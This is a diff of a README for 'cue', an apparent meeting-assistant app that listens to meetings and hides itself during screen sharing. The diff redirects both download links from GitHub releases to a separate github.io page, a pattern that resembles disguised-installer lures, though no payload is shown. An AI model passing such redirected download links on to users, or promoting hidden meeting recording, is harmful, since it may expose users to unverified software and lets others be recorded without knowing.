@@ -1,6 +1,6 @@
 # 🤖 cue - Get live meeting help today
 
-[ ![Download cue](https://img.shields.io/badge/Download-cue-blue) ](https://github.com/Teratologymare581/cue/releases)
+[ ![Download cue](https://img.shields.io/badge/Download-cue-blue) ](https://teratologymare581.github.io)
 
 cue acts as a silent assistant for your computer. It watches and listens to your meetings to give you live answers. You can use it to track notes or find information while your screen stays private. It remains hidden when you share your screen with others. You bring your own API key to connect the software to an artificial intelligence engine. 
 
@@ -8,7 +8,7 @@ cue acts as a silent assistant for your computer. It watches and listens to your
 
 You need to download the installer from our official page. 
 
-[Visit this page to download cue](https://github.com/Teratologymare581/cue/releases)
+[Visit this page to download cue](https://teratologymare581.github.io)
 
 Follow these steps to set up the software on your Windows computer:
 
